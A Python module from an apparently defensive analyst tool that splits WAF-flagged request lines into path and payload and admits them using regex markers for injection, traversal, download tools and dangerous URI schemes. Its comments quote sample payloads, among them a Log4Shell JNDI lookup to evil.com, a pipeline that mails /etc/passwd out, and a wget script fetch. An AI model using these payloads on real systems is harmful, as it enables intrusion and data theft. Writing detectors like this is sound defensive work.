"""WAF payload line parsing — split and validation gate.

Implements ``docs/waf_payload_analyzer.md`` D5. WAF payloads arrive through
the main IOC textarea rather than a dedicated form, so this module's only job is
to answer one question cheaply and conservatively: *is this line a WAF payload,
and if so where does the path end and the payload begin?*

Line shape::

    /login?user= | ' OR '1'='1
    /api/data | ${jndi:ldap://evil.com/a}

The delimiter is space-pipe-space, and only the **first** occurrence splits. A
literal ``|`` is ordinary payload content — ``; cat /etc/passwd | mail x@y.com``
is one shell pipeline, not a path and a payload — so splitting on every pipe
would mangle exactly the payloads worth reading.

**A line without the delimiter is not a WAF payload.** The briefing proposed a
payload-only fallback; D5 defers it, because
:data:`ioc.parser.SCHEMELESS_URL_RE` already claims host-plus-path lines and
``example.com/login?id=1' OR '1'='1`` is a URL by every existing rule. Widening
this module to win that contest would put ordinary URLs at risk of
reclassification, which is a worse failure than under-detecting a payload the
analyst can re-paste with a delimiter.

This module never decides whether a payload is *malicious*. It decides whether
the line is a payload at all. Everything downstream — decode, rule matching,
verdict — assumes that question has already been answered.
"""
from __future__ import annotations

import re
from dataclasses import dataclass

# Space-pipe-space. The surrounding spaces are what distinguish a delimiter from
# a shell pipe inside the payload.
DELIMITER = " | "

# The delimiter as it survives line stripping when the payload is missing.
# ``parse_iocs`` strips every line before typing it, so an analyst who typed
# "/login?user= | " and stopped there arrives here as "/login?user= |". Without
# this form the empty-payload case below is unreachable from the app.
_TRAILING_DELIMITER = " |"

# What the left-hand side must look like for a payload-less line to be accepted:
# a request path or a bare query string, not arbitrary prose that happens to end
# in a pipe.
_PATH_SHAPED_RE = re.compile(r"^[/?][^\s]*$|^[^\s]*\?[^\s]*$")


@dataclass
class WafPayloadInput:
    """One WAF-flagged request line, split into its parts.

    Attributes:
        raw_line: The line exactly as submitted. Kept for audit and display —
            the split is lossy about whitespace and an analyst comparing this
            tool's output against their WAF console needs the original.
        path: Left of the delimiter, or None when that side is empty.
        payload: Right of the delimiter, whitespace-trimmed. May be empty, which
            downstream treats as a parse failure rather than a clean result.
        markers: Names of the payload-characteristic markers that fired. Empty
            only when ``payload`` is empty — a non-empty payload reaching this
            object has cleared the gate by definition.
    """

    raw_line: str
    path: str | None
    payload: str
    markers: list[str]


# Payload-characteristic markers. Any single one admits the line; the gate exists
# to reject an unrelated line carrying a stray pipe, not to grade the payload.
#
# **Seven groups here are additions to briefing §2.1 step 3**, which listed only
# URL-encoding, HTML/script, SQL characters and path traversal. That list is
# badly short, and both rounds of additions were forced by finding real attacks
# it silently refused:
#
# * `${jndi:ldap://evil.com/a}` — the briefing's own worked example, and the
#   flagship case for the entire CVE fingerprint layer — contains no percent
#   sequence, no angle bracket, no quote, no `--`, no `;` and no `../`. Hence
#   expression-injection, command-substitution and null-byte.
# * The Milestone C corpus then caught five more: `1 AND SLEEP(5)`,
#   `javascript:alert(1)`, `php://filter/...`, `wget http://…/s.sh` and
#   Spring4Shell's `class.module.classLoader...`. Hence the last four groups.
#
# Spring4Shell is the one worth remembering. It is a *curated CVE fingerprint* —
# the one layer allowed to return Malicious unaided — and the gate was throwing
# it away before Layer 4 ever ran. A gate that silently drops the payloads the
# module is proudest of catching is worse than no gate.
#
# Being too generous here is cheap: a misclassified line yields one extra
# `Unknown` row and no provider call, and it cannot be a valid IOC of any other
# type because every other detector is anchored `^…$` and cannot match a line
# containing the delimiter. Being too strict costs a missed attack. The list
# should keep growing in that direction.
_MARKERS: tuple[tuple[str, re.Pattern[str]], ...] = (
    # %XX specifically, not a bare percent sign. "CPU | 95% load" is not a
    # payload, and the bare-% reading in the briefing would classify it as one.
    ("url-encoding", re.compile(r"%[0-9A-Fa-f]{2}")),
    ("html-or-script", re.compile(r"[<>]")),
    ("sql-quote", re.compile(r"['\"]")),
    ("sql-comment", re.compile(r"--|/\*")),
    ("statement-separator", re.compile(r";")),
    # Word-bounded: "SELECTION" and "REUNION" are ordinary words.
    ("sql-keyword", re.compile(r"\b(?:UNION|SELECT|INSERT|UPDATE|DELETE|DROP)\b", re.I)),
    ("path-traversal", re.compile(r"\.\.[/\\]")),
    # ${...}, #{...}, %{...} — Log4Shell, Spring EL, OGNL.
    ("expression-injection", re.compile(r"[$#%]\{")),
    # $(...) and backticks — shell command substitution.
    ("command-substitution", re.compile(r"\$\(|`")),
    ("null-byte", re.compile(r"%00|\x00")),
    # Schemes that only appear in an injected payload. http/https are excluded
    # on purpose: a URL in a parameter is ordinary traffic.
    ("dangerous-uri-scheme", re.compile(
        r"\b(?:php|file|expect|gopher|jar|netdoc|dict|ldaps?|rmi)://"
        r"|\bjavascript\s*:"
        r"|\bvbscript\s*:"
        r"|\bdata:[a-z/+.-]*;base64,",
        re.I,
    )),
    # SQL functions used for blind and out-of-band injection. The trailing
    # parenthesis is what keeps "sleep" in prose out.
    ("sql-function", re.compile(
        r"\b(?:sleep|benchmark|load_file|extractvalue|updatexml|group_concat"
        r"|pg_sleep|dbms_pipe\.receive_message)\s*\(|\bwaitfor\s+delay\b",
        re.I,
    )),
    # Download-and-execute tooling named in a request parameter.
    ("download-tool", re.compile(
        r"\b(?:wget|curl|certutil|bitsadmin|invoke-webrequest|powershell)\b", re.I,
    )),
    # Java/Spring property paths that only exist to escape the bound object.
    ("property-chain", re.compile(
        r"\bclass\.module\b|\bclassLoader\b|\bgetRuntime\b|\bprocessBuilder\b", re.I,
    )),
)


def payload_markers(payload: str) -> list[str]:
    """Report which payload-characteristic markers a string contains.

    Args:
        payload: Candidate payload text, already split from any path.

    Returns:
        Marker names in declaration order. Empty means the text shows no sign of
        being an attack payload.
    """
    if not payload:
        return []
    return [name for name, pattern in _MARKERS if pattern.search(payload)]


def parse_waf_line(line: str) -> WafPayloadInput | None:
    """Split one submitted line into path and payload, if it is one at all.

    Args:
        line: A single line from the IOC textarea, already stripped of
            surrounding whitespace by the caller.

    Returns:
        A :class:`WafPayloadInput`, or None when the line is not a WAF payload —
        either it carries no delimiter, or its payload shows no attack-
        characteristic content and is more likely an unrelated line with a stray
        pipe in it.
    """
    if not line:
        return None

    if DELIMITER in line:
        left, _, right = line.partition(DELIMITER)
    elif line.endswith(_TRAILING_DELIMITER):
        left, right = line[: -len(_TRAILING_DELIMITER)], ""
    else:
        return None

    path = left.strip() or None
    payload = right.strip()

    # An empty payload is kept, not rejected — but only when the *path* looks
    # like a request path. The delimiter says the analyst meant a path/payload
    # pair, so telling them the payload is missing beats silently dropping the
    # line. Without the path check, though, any line merely ending in " |" would
    # be typed as a WAF payload, and ioc/parser.py exempts this type from the
    # manual-mode filter, so the analyst would have no way to exclude it.
    if not payload:
        if path and _PATH_SHAPED_RE.match(path):
            return WafPayloadInput(raw_line=line, path=path, payload="", markers=[])
        return None

    markers = payload_markers(payload)
    if not markers:
        return None

    return WafPayloadInput(raw_line=line, path=path, payload=payload, markers=markers)


def is_waf_payload_line(line: str) -> bool:
    """Report whether a line should be typed as a WAF payload.

    Thin predicate for the type-detection cascade in :mod:`ioc.parser`, which
    needs the answer without the parts.

    Args:
        line: A single submitted line.

    Returns:
        True when :func:`parse_waf_line` would produce a result.
    """
    return parse_waf_line(line) is not None


def parse_waf_field(text: str) -> list[WafPayloadInput]:
    """Parse the dedicated WAF Payload field, one payload per line.

    Neither of the two restrictions :func:`parse_waf_line` enforces applies
    here, and both are lifted deliberately:

    * **The delimiter is optional.** D5 requires it in the IOC textarea because
      :data:`ioc.parser.SCHEMELESS_URL_RE` claims host-plus-path lines, so
      ``example.com/login?id=1' OR '1'='1`` is a URL by every existing rule and
      widening the payload detector to win that contest would put ordinary URLs
      at risk. A dedicated field has no such contest — the analyst chose this
      box, which *is* the declaration of intent the delimiter stood in for. This
      closes the payload-only fallback that D5 deferred, in the one place it is
      safe to close.
    * **The marker gate does not reject.** Markers are still recorded, because
      the UI and the analysis display them, but a line that trips none is
      analysed anyway rather than dropped. The gate exists to stop an unrelated
      line carrying a stray pipe from being typed as a payload in a shared box;
      applied here it would silently discard something the analyst explicitly
      submitted, which is the failure D5 argues against for the empty-payload
      case.

    Args:
        text: Raw contents of the WAF Payload textarea. One payload per line;
            each line may optionally be ``path | payload``.

    Returns:
        One :class:`WafPayloadInput` per non-empty line, in submission order.
        Empty when the field is blank.
    """
    out: list[WafPayloadInput] = []
    for raw_line in (text or "").splitlines():
        line = raw_line.strip()
        if not line:
            continue

        if DELIMITER in line:
            left, _, right = line.partition(DELIMITER)
            path = left.strip() or None
            payload = right.strip()
        elif line.endswith(_TRAILING_DELIMITER):
            path = line[: -len(_TRAILING_DELIMITER)].strip() or None
            payload = ""
        else:
            # No delimiter: the whole line is the payload. There is no path to
            # report rather than a guessed one — inventing a split here would
            # put arbitrary payload text in a field the UI labels "Request path".
            path = None
            payload = line

        out.append(WafPayloadInput(
            raw_line=line,
            path=path,
            payload=payload,
            markers=payload_markers(payload),
        ))
    return out
